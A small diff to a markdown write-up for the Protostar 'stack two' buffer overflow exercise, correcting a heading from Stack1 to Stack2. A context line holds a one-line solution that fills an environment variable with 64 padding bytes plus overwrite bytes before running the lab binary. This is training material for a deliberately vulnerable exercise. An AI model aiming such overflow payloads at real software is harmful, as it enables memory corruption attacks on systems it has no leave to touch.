@@ -2,7 +2,7 @@
 TL;DR -> `export GREENIE=$(python -c "print 'A'*64 + '\x0a\x0d\x0a\x0d'") && ./stack2`
 ```
 
-# Stack1
+# Stack2
 
 URL: https://exploit.education/protostar/stack-two/
 
